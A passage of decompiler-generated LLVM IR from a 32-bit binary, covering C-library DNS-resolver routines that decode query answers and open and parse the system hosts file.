  %v3_8067675 = add i32 %v2_8067675, 1
  %v4_8067675 = inttoptr i32 %v3_8067675 to i8*
  store i8 %v1_8067675, i8* %v4_8067675, align 1
  %v0_8067678 = load i32, i32* @esi, align 4
  %v1_8067678 = add i32 %v0_8067678, 9
  %v2_8067678 = inttoptr i32 %v1_8067678 to i8*
  %v3_8067678 = load i8, i8* %v2_8067678, align 1
  %v2_806767c = load i32, i32* @edx, align 4
  %v3_806767c = add i32 %v2_806767c, 2
  %v4_806767c = inttoptr i32 %v3_806767c to i8*
  store i8 %v3_8067678, i8* %v4_806767c, align 1
  %v0_806767f = load i32, i32* @esi, align 4
  %v1_806767f = add i32 %v0_806767f, 8
  %v2_806767f = inttoptr i32 %v1_806767f to i32*
  %v3_806767f = load i32, i32* %v2_806767f, align 4
  %v1_8067682 = trunc i32 %v3_806767f to i8
  %v2_8067682 = load i32, i32* @edx, align 4
  %v3_8067682 = add i32 %v2_8067682, 3
  %v4_8067682 = inttoptr i32 %v3_8067682 to i8*
  store i8 %v1_8067682, i8* %v4_8067682, align 1
  %v0_8067686.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8067685

dec_label_pc_8067685:                             ; preds = %entry, %dec_label_pc_8067661, %dec_label_pc_8067666
  %v0_8067686 = phi i32 [ %v8_806764c, %entry ], [ -1, %dec_label_pc_8067661 ], [ %v0_8067686.pre, %dec_label_pc_8067666 ]
  %v2_8067685 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8067685, i32* @ebx, align 4
  store i32 %v0_8067638, i32* @edi, align 4
  ret i32 %v0_8067686

; uselistorder directives
  uselistorder i32 %v1_806765c, { 1, 0 }
  uselistorder i32 %v2_806765a, { 0, 2, 1 }
  uselistorder i32 %v8_806764c, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 -3, { 8, 4, 18, 7, 0, 1, 5, 16, 6, 17, 9, 10, 11, 12, 13, 14, 15, 2, 3 }
  uselistorder label %dec_label_pc_8067685, { 2, 1, 0 }
}

define i32 @__length_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v2_8067697 = call i32 @__length_dotted(i32 %tmp, i32 %tmp1)
  %v2_806769c = icmp slt i32 %v2_8067697, 0
  %v1_806769e = add i32 %v2_8067697, 4
  %v1_80676a1 = icmp eq i1 %v2_806769c, false
  %v4_80676a1 = select i1 %v1_80676a1, i32 %v1_806769e, i32 %v2_8067697
  ret i32 %v4_80676a1

; uselistorder directives
  uselistorder i32 %v2_8067697, { 1, 0, 2 }
}

define i32 @__decode_answer() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80676a8 = load i32, i32* @ebp, align 4
  %v0_80676a9 = load i32, i32* @edi, align 4
  %v0_80676aa = load i32, i32* @esi, align 4
  %v0_80676ab = load i32, i32* @ebx, align 4
  store i32 %v0_80676ab, i32* %stack_var_-16, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v2_80676cc = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_80676cc, i32* %eax.global-to-local, align 4
  %v4_80676d9 = call i32 @__decode_dotted(i32 %tmp4, i32 %tmp7, i32 %v2_80676cc, i32 256)
  store i32 %v4_80676d9, i32* %eax.global-to-local, align 4
  %v3_80676e1 = icmp slt i32 %v4_80676d9, 0
  store i32 %v4_80676d9, i32* @edi, align 4
  br i1 %v3_80676e1, label %dec_label_pc_8067794, label %dec_label_pc_80676eb

dec_label_pc_80676eb:                             ; preds = %entry
  %v0_80676eb = load i32, i32* @ebx, align 4
  %v3_80676eb = add i32 %v0_80676eb, %v4_80676d9
  %v0_80676ed = load i32, i32* @esi, align 4
  %v2_80676ed = sub i32 %v0_80676ed, %v3_80676eb
  %v1_80676ef = add i32 %v2_80676ed, -10
  %v10_80676ef = icmp slt i32 %v1_80676ef, 0
  store i32 %v1_80676ef, i32* @esi, align 4
  %v1_80676fa = icmp eq i1 %v10_80676ef, false
  br i1 %v1_80676fa, label %dec_label_pc_8067703, label %dec_label_pc_80676fc

dec_label_pc_80676fc:                             ; preds = %dec_label_pc_80676eb
  br label %dec_label_pc_8067794

dec_label_pc_8067703:                             ; preds = %dec_label_pc_80676eb
  %v6_806770a = add i32 %v3_80676eb, %tmp4
  store i32 %v6_806770a, i32* @ebx, align 4
  store i32 %v2_80676cc, i32* %eax.global-to-local, align 4
  %v1_8067716 = bitcast i32* %stack_var_-272 to i8*
  %v2_8067716 = call i32 @__GI_strdup(i8* %v1_8067716)
  store i32 %v2_8067716, i32* %eax.global-to-local, align 4
  %v0_806771b = load i32, i32* @ebx, align 4
  %v1_806771b = add i32 %v0_806771b, 4
  store i32 %v1_806771b, i32* %esi.global-to-local, align 4
  %v1_806771e = load i32, i32* @ebp, align 4
  %v2_806771e = inttoptr i32 %v1_806771e to i32*
  store i32 %v2_8067716, i32* %v2_806771e, align 4
  %v0_8067721 = load i32, i32* @ebx, align 4
  %v1_8067721 = inttoptr i32 %v0_8067721 to i8*
  %v2_8067721 = load i8, i8* %v1_8067721, align 1
  %v3_8067721 = zext i8 %v2_8067721 to i32
  store i32 %v3_8067721, i32* %eax.global-to-local, align 4
  %v1_8067724 = add i32 %v0_8067721, 1
  %v2_8067724 = inttoptr i32 %v1_8067724 to i8*
  %v3_8067724 = load i8, i8* %v2_8067724, align 1
  %v4_8067724 = zext i8 %v3_8067724 to i32
  store i32 %v4_8067724, i32* %edx.global-to-local, align 4
  %v2_8067728 = mul nuw nsw i32 %v3_8067721, 256
  %v2_806772b = or i32 %v4_8067724, %v2_8067728
  store i32 %v2_806772b, i32* %eax.global-to-local, align 4
  %v1_806772d = load i32, i32* @ebp, align 4
  %v2_806772d = add i32 %v1_806772d, 4
  %v3_806772d = inttoptr i32 %v2_806772d to i32*
  store i32 %v2_806772b, i32* %v3_806772d, align 4
  %v0_8067730 = load i32, i32* @ebx, align 4
  %v1_8067730 = add i32 %v0_8067730, 2
  %v2_8067730 = inttoptr i32 %v1_8067730 to i8*
  %v3_8067730 = load i8, i8* %v2_8067730, align 1
  %v4_8067730 = zext i8 %v3_8067730 to i32
  store i32 %v4_8067730, i32* %eax.global-to-local, align 4
  %v1_8067734 = add i32 %v0_8067730, 3
  %v2_8067734 = inttoptr i32 %v1_8067734 to i8*
  %v3_8067734 = load i8, i8* %v2_8067734, align 1
  %v4_8067734 = zext i8 %v3_8067734 to i32
  store i32 %v4_8067734, i32* %edx.global-to-local, align 4
  %v2_8067738 = mul nuw nsw i32 %v4_8067730, 256
  %v2_806773b = or i32 %v4_8067734, %v2_8067738
  store i32 %v2_806773b, i32* %eax.global-to-local, align 4
  %v1_806773d = load i32, i32* @ebp, align 4
  %v2_806773d = add i32 %v1_806773d, 8
  %v3_806773d = inttoptr i32 %v2_806773d to i32*
  store i32 %v2_806773b, i32* %v3_806773d, align 4
  %v0_8067740 = load i32, i32* @ebx, align 4
  %v1_8067740 = add i32 %v0_8067740, 4
  %v2_8067740 = inttoptr i32 %v1_8067740 to i8*
  %v3_8067740 = load i8, i8* %v2_8067740, align 1
  %v4_8067740 = zext i8 %v3_8067740 to i32
  store i32 %v4_8067740, i32* %edx.global-to-local, align 4
  %v0_8067744 = load i32, i32* %esi.global-to-local, align 4
  %v1_8067744 = add i32 %v0_8067744, 1
  %v2_8067744 = inttoptr i32 %v1_8067744 to i8*
  %v3_8067744 = load i8, i8* %v2_8067744, align 1
  %v4_8067744 = zext i8 %v3_8067744 to i32
  store i32 %v4_8067744, i32* %eax.global-to-local, align 4
  %v1_8067748 = add i32 %v0_8067744, 2
  %v2_8067748 = inttoptr i32 %v1_8067748 to i8*
  %v3_8067748 = load i8, i8* %v2_8067748, align 1
  %v4_8067748 = zext i8 %v3_8067748 to i32
  %v2_806774c = mul nuw i32 %v4_8067740, 16777216
  %v2_806774f = mul nuw nsw i32 %v4_8067744, 65536
  store i32 %v2_806774f, i32* %eax.global-to-local, align 4
  %v2_8067752 = or i32 %v2_806774f, %v2_806774c
  store i32 %v2_8067752, i32* %edx.global-to-local, align 4
  %v1_8067754 = add i32 %v0_8067744, 3
  %v2_8067754 = inttoptr i32 %v1_8067754 to i8*
  %v3_8067754 = load i8, i8* %v2_8067754, align 1
  %v4_8067754 = zext i8 %v3_8067754 to i32
  store i32 %v4_8067754, i32* %eax.global-to-local, align 4
  %v2_8067758 = mul nuw nsw i32 %v4_8067748, 256
  %v2_806775b = or i32 %v4_8067754, %v2_8067752
  store i32 %v2_806775b, i32* %edx.global-to-local, align 4
  %v2_806775d = or i32 %v2_806775b, %v2_8067758
  store i32 %v2_806775d, i32* @ecx, align 4
  %v1_806775f = load i32, i32* @ebp, align 4
  %v2_806775f = add i32 %v1_806775f, 12
  %v3_806775f = inttoptr i32 %v2_806775f to i32*
  store i32 %v2_806775d, i32* %v3_806775f, align 4
  %v0_8067762 = load i32, i32* @ebx, align 4
  %v1_8067762 = add i32 %v0_8067762, 8
  %v2_8067762 = inttoptr i32 %v1_8067762 to i8*
  %v3_8067762 = load i8, i8* %v2_8067762, align 1
  %v4_8067762 = zext i8 %v3_8067762 to i32
  store i32 %v4_8067762, i32* %edx.global-to-local, align 4
  %v1_8067766 = add i32 %v0_8067762, 9
  %v2_8067766 = inttoptr i32 %v1_8067766 to i8*
  %v3_8067766 = load i8, i8* %v2_8067766, align 1
  %v4_8067766 = zext i8 %v3_8067766 to i32
  store i32 %v4_8067766, i32* %eax.global-to-local, align 4
  %v1_806776a = add i32 %v0_8067762, 10
  %v1_806776d = load i32, i32* @ebp, align 4
  %v2_806776d = add i32 %v1_806776d, 20
  %v3_806776d = inttoptr i32 %v2_806776d to i32*
  store i32 %v1_806776a, i32* %v3_806776d, align 4
  %v0_8067770 = load i32, i32* %edx.global-to-local, align 4
  %v2_8067770 = mul i32 %v0_8067770, 256
  %v1_8067773 = load i32, i32* %eax.global-to-local, align 4
  %v2_8067773 = or i32 %v1_8067773, %v2_8067770
  store i32 %v2_8067773, i32* @edx, align 4
  %v1_8067775 = load i32, i32* @ebp, align 4
  %v2_8067775 = add i32 %v1_8067775, 16
  %v3_8067775 = inttoptr i32 %v2_8067775 to i32*
  store i32 %v2_8067773, i32* %v3_8067775, align 4
  %v1_806777f = add i32 %v3_80676eb, 10
  store i32 %v1_806777f, i32* %eax.global-to-local, align 4
  %v1_8067782 = load i32, i32* @ebp, align 4
  %v2_8067782 = add i32 %v1_8067782, 24
  %v3_8067782 = inttoptr i32 %v2_8067782 to i32*
  store i32 %v1_806777f, i32* %v3_8067782, align 4
  %v4_8067785 = load i32, i32* @edx, align 4
  %v5_8067789 = icmp slt i32 %v1_80676ef, %v4_8067785
  br i1 %v5_8067789, label %dec_label_pc_806778b, label %dec_label_pc_8067790

dec_label_pc_806778b:                             ; preds = %dec_label_pc_8067703
  br label %dec_label_pc_8067794

dec_label_pc_8067790:                             ; preds = %dec_label_pc_8067703
  %v1_8067790 = load i32, i32* @edi, align 4
  %v2_8067790 = add i32 %v4_8067785, 10
  %v3_8067790 = add i32 %v2_8067790, %v1_8067790
  br label %dec_label_pc_8067794

dec_label_pc_8067794:                             ; preds = %entry, %dec_label_pc_806778b, %dec_label_pc_80676fc, %dec_label_pc_8067790
  %v0_806779a = phi i32 [ %v4_80676d9, %entry ], [ -1, %dec_label_pc_806778b ], [ %v1_80676ef, %dec_label_pc_80676fc ], [ %v3_8067790, %dec_label_pc_8067790 ]
  store i32 %v0_806779a, i32* %eax.global-to-local, align 4
  %v2_806779c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_806779c, i32* @ebx, align 4
  store i32 %v0_80676aa, i32* @esi, align 4
  store i32 %v0_80676a9, i32* @edi, align 4
  store i32 %v0_80676a8, i32* @ebp, align 4
  ret i32 %v0_806779a

; uselistorder directives
  uselistorder i32 %v0_806779a, { 1, 0 }
  uselistorder i32 %v2_806774f, { 1, 0 }
  uselistorder i32 %v1_80676ef, { 0, 1, 3, 2 }
  uselistorder i32 %v3_80676eb, { 1, 0, 2 }
  uselistorder i32 %v4_80676d9, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_80676cc, { 1, 0, 2 }
  uselistorder i32 24, { 69, 70, 14, 12, 3, 13, 78, 87, 88, 0, 41, 42, 43, 44, 45, 4, 29, 77, 18, 71, 72, 73, 79, 20, 46, 76, 47, 89, 53, 2, 48, 1, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 74, 80, 81, 82, 83, 84, 85, 86, 91, 11, 75, 49, 90, 50, 51, 52, 93, 92, 54, 19, 21, 22, 23, 24, 25, 26, 27, 15, 28, 55, 56, 57, 58, 59, 16, 60, 61, 5, 6, 62, 7, 8, 63, 9, 10, 64, 65, 66, 67, 17, 68 }
  uselistorder i32 16777216, { 5, 7, 6, 9, 8, 11, 10, 13, 12, 14, 17, 15, 18, 16, 20, 19, 21, 23, 22, 0, 25, 24, 1, 27, 26, 2, 28, 3, 4 }
  uselistorder i32 (i8*)* @__GI_strdup, { 4, 2, 3, 0, 1 }
  uselistorder i32 -10, { 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__decode_dotted, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8067794, { 3, 1, 2, 0 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v3_80677b1 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_806f19e.801 to i32), i32 ptrtoint (i32* @global_var_806f0d1.764 to i32))
  store i32 %v3_80677b1, i32* @eax, align 4
  %v1_80677b9 = icmp eq i32 %v3_80677b1, 0
  %v1_80677bb = icmp eq i1 %v1_80677b9, false
  br i1 %v1_80677bb, label %dec_label_pc_80677d1, label %dec_label_pc_80677bd

dec_label_pc_80677bd:                             ; preds = %entry
  %v3_80677c9 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_806f1a9.802 to i32), i32 ptrtoint (i32* @global_var_806f0d1.764 to i32))
  br label %dec_label_pc_80677d1

dec_label_pc_80677d1:                             ; preds = %entry, %dec_label_pc_80677bd
  %v0_80677d4 = phi i32 [ %v3_80677b1, %entry ], [ %v3_80677c9, %dec_label_pc_80677bd ]
  ret i32 %v0_80677d4

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 1, 0, 4, 3, 14, 13, 12, 6, 5, 11, 10, 9, 8, 7, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_806f0d1.764 to i32), { 0, 1, 2, 6, 3, 7, 4, 5 }
  uselistorder label %dec_label_pc_80677d1, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp60 = ptrtoint i32* %arg5 to i32
  %stack_var_-44 = alloca i8*, align 4
  %v0_80677d5 = load i32, i32* @ebp, align 4
  %v0_80677d6 = load i32, i32* @edi, align 4
  %v0_80677d7 = load i32, i32* @esi, align 4
  %v0_80677d8 = load i32, i32* @ebx, align 4
  store i32 %arg6, i32* @ebx, align 4
  store i32 %arg7, i32* %edx.global-to-local, align 4
  %v1_80677e6 = sub i32 0, %arg6
  %v1_80677e8 = urem i32 %v1_80677e6, 4
  %v2_80677e8 = icmp eq i32 %v1_80677e8, 0
  store i32 %v1_80677e8, i32* %eax.global-to-local, align 4
  br i1 %v2_80677e8, label %dec_label_pc_80677f9, label %dec_label_pc_80677ed

dec_label_pc_80677ed:                             ; preds = %entry
  %v2_80677ed = sub i32 %arg7, %v1_80677e8
  %v7_80677ed = icmp ugt i32 %v1_80677e8, %arg7
  br i1 %v7_80677ed, label %dec_label_pc_8067a9d, label %dec_label_pc_80677f5

dec_label_pc_80677f5:                             ; preds = %dec_label_pc_80677ed
  %v2_80677f5 = add i32 %v1_80677e8, %arg6
  store i32 %v2_80677f5, i32* @ebx, align 4
  store i32 %v2_80677ed, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80677f9

dec_label_pc_80677f9:                             ; preds = %entry, %dec_label_pc_80677f5
  %v0_8067807 = phi i32 [ %arg6, %entry ], [ %v2_80677f5, %dec_label_pc_80677f5 ]
  %v0_806780e = phi i32 [ %arg7, %entry ], [ %v2_80677ed, %dec_label_pc_80677f5 ]
  %tmp = icmp ult i32 %v0_806780e, 32
  br i1 %tmp, label %dec_label_pc_8067a9d, label %dec_label_pc_8067802

dec_label_pc_8067802:                             ; preds = %dec_label_pc_80677f9
  %v12_8067802 = icmp eq i32 %arg4, 1
  %v1_8067807 = add i32 %v0_8067807, 32
  store i32 %v1_8067807, i32* %eax.global-to-local, align 4
  %v1_806780e = add i32 %v0_806780e, -32
  store i32 %v1_806780e, i32* @ebp, align 4
  br i1 %v12_8067802, label %dec_label_pc_8067802.dec_label_pc_806794d_crit_edge, label %dec_label_pc_8067817

dec_label_pc_8067802.dec_label_pc_806794d_crit_edge: ; preds = %dec_label_pc_8067802
  %.pre = inttoptr i32 %arg9 to i32*
  br label %dec_label_pc_806794d

dec_label_pc_8067817:                             ; preds = %dec_label_pc_8067802
  store i32 %arg9, i32* %eax.global-to-local, align 4
  %v1_806781e = inttoptr i32 %arg9 to i32*
  store i32 -1, i32* %v1_806781e, align 4
  %tmp144 = icmp ult i32 %v1_806780e, 4
  br i1 %tmp144, label %dec_label_pc_8067a9d, label %dec_label_pc_806782a

dec_label_pc_806782a:                             ; preds = %dec_label_pc_8067817
  %v0_806782a = load i32, i32* %edx.global-to-local, align 4
  %v1_806782a = add i32 %v0_806782a, -36
  store i32 %v1_806782a, i32* %eax.global-to-local, align 4
  %tmp145 = icmp ult i32 %v1_806782a, 8
  br i1 %tmp145, label %dec_label_pc_8067a9d, label %dec_label_pc_8067836

dec_label_pc_8067836:                             ; preds = %dec_label_pc_806782a
  %v0_8067836 = load i32, i32* @ebp, align 4
  %tmp146 = icmp ult i32 %v0_8067836, 16
  br i1 %tmp146, label %dec_label_pc_8067a9d, label %dec_label_pc_806783f

dec_label_pc_806783f:                             ; preds = %dec_label_pc_8067836
  %v1_806783f = add i32 %v0_806782a, -48
  store i32 %v1_806783f, i32* %eax.global-to-local, align 4
  %tmp147 = icmp ult i32 %v1_806783f, 8
  br i1 %tmp147, label %dec_label_pc_8067a9d, label %dec_label_pc_806784b

dec_label_pc_806784b:                             ; preds = %dec_label_pc_806783f
  %v0_806784b = load i32, i32* @ebx, align 4
  %v1_806784b = add i32 %v0_806784b, 48
  %v1_806784e = add i32 %v0_806782a, -44
  store i32 %v1_806784e, i32* @ebp, align 4
  %v1_8067855 = add i32 %v0_806782a, -56
  store i32 %v1_8067855, i32* @eax, align 4
  %v7_8067858 = icmp ult i32 %v1_8067855, %v1_806784e
  %v1_806785a = add i32 %v0_806784b, 36
  store i32 %v1_806785a, i32* @edi, align 4
  br i1 %v7_8067858, label %dec_label_pc_8067864, label %dec_label_pc_806785f

dec_label_pc_806785f:                             ; preds = %dec_label_pc_806784b
  %v1_806785f = add i32 %v0_806784b, 44
  store i32 %v1_806785f, i32* @esi, align 4
  br label %dec_label_pc_8067869

dec_label_pc_8067864:                             ; preds = %dec_label_pc_806784b
  %v1_8067864 = add i32 %v0_806784b, 56
  store i32 %v1_8067864, i32* @esi, align 4
  store i32 %v1_8067855, i32* @ebp, align 4
  br label %dec_label_pc_8067869

dec_label_pc_8067869:                             ; preds = %dec_label_pc_806785f, %dec_label_pc_8067864
  %v0_8067869 = phi i32 [ %v1_806784e, %dec_label_pc_806785f ], [ %v1_8067855, %dec_label_pc_8067864 ]
  %tmp148 = icmp ult i32 %v0_8067869, 80
  br i1 %tmp148, label %dec_label_pc_8067a9d, label %dec_label_pc_8067872

dec_label_pc_8067872:                             ; preds = %dec_label_pc_8067869
  %v0_8067872 = call i32 @__open_etc_hosts()
  store i32 %v0_8067872, i32* %eax.global-to-local, align 4
  %v1_8067877 = icmp eq i32 %v0_8067872, 0
  br i1 %v1_8067877, label %dec_label_pc_806789f, label %dec_label_pc_806787f

dec_label_pc_806787f:                             ; preds = %dec_label_pc_8067872
  store i32 %v1_8067807, i32* %edx.global-to-local, align 4
  store i32 %v1_806784b, i32* %eax.global-to-local, align 4
  %v0_8067887 = load i32, i32* @edi, align 4
  %v0_806788b = load i32, i32* @esi, align 4
  %v4_806788f = inttoptr i32 %v1_8067807 to i8*
  br label %dec_label_pc_806794d

dec_label_pc_806789f:                             ; preds = %dec_label_pc_8067872
  store i32 %arg8, i32* %edx.global-to-local, align 4
  %v1_80678a3 = inttoptr i32 %arg8 to i32*
  store i32 0, i32* %v1_80678a3, align 4
  %v1_80678a9 = call i32 @__errno_location(i32 0)
  store i32 %v1_80678a9, i32* %eax.global-to-local, align 4
  %v1_80678ae = inttoptr i32 %v1_80678a9 to i32*
  %v2_80678ae = load i32, i32* %v1_80678ae, align 4
  store i32 %v2_80678ae, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8067a9d

dec_label_pc_80678b9:                             ; preds = %dec_label_pc_8067a20
  %v2_80678b9 = load i8*, i8** %stack_var_-44, align 4
  %v3_80678b9 = ptrtoint i8* %v2_80678b9 to i32
  store i32 %v3_80678b9, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-40.0, i32* %eax.global-to-local, align 4
  %v2_80678c0 = inttoptr i32 %stack_var_-40.0 to i32*
  store i32 %v3_80678b9, i32* %v2_80678c0, align 4
  %v0_80678c2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80678c2 = add i32 %v0_80678c2, 4
  %v2_80678c2 = inttoptr i32 %v1_80678c2 to i32*
  store i32 0, i32* %v2_80678c2, align 4
  %v0_80678c9 = load i32, i32* @ebx, align 4
  %v1_80678c9 = add i32 %v0_80678c9, 4
  %v2_80678c9 = inttoptr i32 %v1_80678c9 to i32*
  %v3_80678c9 = load i32, i32* %v2_80678c9, align 4
  store i32 %v3_80678c9, i32* %eax.global-to-local, align 4
  store i32 %tmp60, i32* %edx.global-to-local, align 4
  store i32 %v3_80678c9, i32* %arg5, align 4
  %v1_80678d2 = add i32 %tmp60, 8
  %v2_80678d2 = inttoptr i32 %v1_80678d2 to i32*
  store i32 2, i32* %v2_80678d2, align 4
  %v0_80678d9 = load i32, i32* %edx.global-to-local, align 4
  %v1_80678d9 = add i32 %v0_80678d9, 12
  %v2_80678d9 = inttoptr i32 %v1_80678d9 to i32*
  store i32 4, i32* %v2_80678d9, align 4
  br label %dec_label_pc_8067912

dec_label_pc_80678e6:                             ; preds = %dec_label_pc_8067a42
  store i32 %stack_var_-36.0, i32* %eax.global-to-local, align 4
  store i32 %storemerge3, i32* %edx.global-to-local, align 4
  %v2_80678ee = inttoptr i32 %storemerge3 to i32*
  store i32 %stack_var_-36.0, i32* %v2_80678ee, align 4
  %v0_80678f0 = load i32, i32* %edx.global-to-local, align 4
  %v1_80678f0 = add i32 %v0_80678f0, 4
  %v2_80678f0 = inttoptr i32 %v1_80678f0 to i32*
  store i32 0, i32* %v2_80678f0, align 4
  %v0_80678f7 = load i32, i32* @ebx, align 4
  %v1_80678f7 = add i32 %v0_80678f7, 4
  %v2_80678f7 = inttoptr i32 %v1_80678f7 to i32*
  %v3_80678f7 = load i32, i32* %v2_80678f7, align 4
  store i32 %v3_80678f7, i32* %eax.global-to-local, align 4
  store i32 %tmp60, i32* %edx.global-to-local, align 4
  store i32 %v3_80678f7, i32* %arg5, align 4
  %v1_8067900 = add i32 %tmp60, 8
  %v2_8067900 = inttoptr i32 %v1_8067900 to i32*
  store i32 10, i32* %v2_8067900, align 4
  %v0_8067907 = load i32, i32* %edx.global-to-local, align 4
  %v1_8067907 = add i32 %v0_8067907, 12
  %v2_8067907 = inttoptr i32 %v1_8067907 to i32*
  store i32 16, i32* %v2_8067907, align 4
  br label %dec_label_pc_8067912

dec_label_pc_8067912:                             ; preds = %dec_label_pc_80678b9, %dec_label_pc_80678e6
  %storemerge = phi i32 [ %stack_var_-40.0, %dec_label_pc_80678b9 ], [ %storemerge3, %dec_label_pc_80678e6 ]
  %v1_8067912 = load i32, i32* %edx.global-to-local, align 4
  %v2_8067912 = add i32 %v1_8067912, 16
  %v3_8067912 = inttoptr i32 %v2_8067912 to i32*
  store i32 %storemerge, i32* %v3_8067912, align 4
  %v0_8067915 = load i32, i32* @ebx, align 4
  %v1_8067915 = add i32 %v0_8067915, 8
  %v1_8067918 = load i32, i32* %edx.global-to-local, align 4
  %v2_8067918 = add i32 %v1_8067918, 4
  %v3_8067918 = inttoptr i32 %v2_8067918 to i32*
  store i32 %v1_8067915, i32* %v3_8067918, align 4
  store i32 %arg8, i32* %eax.global-to-local, align 4
  %v0_806791f = load i32, i32* %edx.global-to-local, align 4
  %v2_806791f = inttoptr i32 %arg8 to i32*
  store i32 %v0_806791f, i32* %v2_806791f, align 4
  br label %dec_label_pc_8067a7d

dec_label_pc_806794d:                             ; preds = %dec_label_pc_8067802.dec_label_pc_806794d_crit_edge, %dec_label_pc_806787f
  %v1_8067951.pre-phi = phi i32* [ %.pre, %dec_label_pc_8067802.dec_label_pc_806794d_crit_edge ], [ %v1_806781e, %dec_label_pc_806787f ]
  %storemerge4 = phi i8* [ null, %dec_label_pc_8067802.dec_label_pc_806794d_crit_edge ], [ %v4_806788f, %dec_label_pc_806787f ]
  %stack_var_-20.0.in = phi i32 [ %v1_8067807, %dec_label_pc_8067802.dec_label_pc_806794d_crit_edge ], [ %v0_806788b, %dec_label_pc_806787f ]
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_8067802.dec_label_pc_806794d_crit_edge ], [ %v1_8067807, %dec_label_pc_806787f ]
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_8067802.dec_label_pc_806794d_crit_edge ], [ %v0_8067887, %dec_label_pc_806787f ]
  %stack_var_4.0 = phi i32 [ %arg1, %dec_label_pc_8067802.dec_label_pc_806794d_crit_edge ], [ %v0_8067872, %dec_label_pc_806787f ]
  %storemerge3 = phi i32 [ 0, %dec_label_pc_8067802.dec_label_pc_806794d_crit_edge ], [ %v1_806784b, %dec_label_pc_806787f ]
  store i8* %storemerge4, i8** %stack_var_-44, align 4
  %stack_var_-20.0 = inttoptr i32 %stack_var_-20.0.in to i8*
  store i32 %arg9, i32* @edx, align 4
  store i32 1, i32* %v1_8067951.pre-phi, align 4
  %v12_80679db = icmp eq i32 %arg4, 2
  %v2_8067a06 = inttoptr i32 %arg2 to i8*
  %v12_8067a19 = icmp eq i32 %arg3, 2
  %v12_8067a3b = icmp eq i32 %arg3, 10
  %v1_80679e5 = icmp eq i1 %v12_80679db, false
  %v1_8067a1e = icmp eq i1 %v12_8067a19, false
  %v1_8067a40 = icmp eq i1 %v12_8067a3b, false
  br label %dec_label_pc_8067a63.outer

dec_label_pc_8067a63.outer:                       ; preds = %dec_label_pc_8067a3b, %dec_label_pc_8067a42, %dec_label_pc_8067a20, %dec_label_pc_806794d
  %stack_var_-28.0.ph = phi i32 [ 1, %dec_label_pc_806794d ], [ 2, %dec_label_pc_8067a20 ], [ 2, %dec_label_pc_8067a42 ], [ 2, %dec_label_pc_8067a3b ]
  br label %dec_label_pc_8067a63

dec_label_pc_8067964:                             ; preds = %dec_label_pc_8067a63
  %v3_806796c = call i32 @__GI_strchr(i8* %stack_var_-20.0, i32 35)
  store i32 %v3_806796c, i32* @eax, align 4
  %v1_8067974 = icmp eq i32 %v3_806796c, 0
  br i1 %v1_8067974, label %dec_label_pc_806797b, label %dec_label_pc_8067978

dec_label_pc_8067978:                             ; preds = %dec_label_pc_8067964
  %v1_8067978 = inttoptr i32 %v3_806796c to i8*
  store i8 0, i8* %v1_8067978, align 1
  br label %dec_label_pc_806797b

dec_label_pc_806797b:                             ; preds = %dec_label_pc_8067964, %dec_label_pc_8067978
  store i32 %stack_var_-20.0.in, i32* @ecx, align 4
  store i32 0, i32* @edi, align 4
  %v2_80679bb34 = load i8, i8* %stack_var_-20.0, align 1
  %v3_80679bb35 = icmp eq i8 %v2_80679bb34, 0
  %v1_80679be41 = icmp eq i1 %v3_80679bb35, false
  br i1 %v1_80679be41, label %dec_label_pc_8067987.preheader.preheader, label %dec_label_pc_80679c0

dec_label_pc_8067987.preheader.preheader:         ; preds = %dec_label_pc_806797b
  %v4_806798798.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8067987.preheader

dec_label_pc_8067983:                             ; preds = %dec_label_pc_806798d
  store i8 0, i8* %v1_8067987104, align 1
  %v0_8067986 = load i32, i32* @ecx, align 4
  %v1_8067986 = add i32 %v0_8067986, 1
  store i32 %v1_8067986, i32* @ecx, align 4
  %v1_8067987 = inttoptr i32 %v1_8067986 to i8*
  %v2_8067987 = load i8, i8* %v1_8067987, align 1
  %v3_8067987 = zext i8 %v2_8067987 to i32
  %v4_8067987 = load i32, i32* %eax.global-to-local, align 4
  %v5_8067987 = and i32 %v4_8067987, -256
  %v6_8067987 = or i32 %v5_8067987, %v3_8067987
  store i32 %v6_8067987, i32* @eax, align 4
  %v4_8067989 = icmp eq i8 %v2_8067987, 0
  br i1 %v4_8067989, label %dec_label_pc_8067987.dec_label_pc_80679c0.loopexit_crit_edge, label %dec_label_pc_806798d

dec_label_pc_806798d:                             ; preds = %dec_label_pc_8067987.preheader, %dec_label_pc_8067983
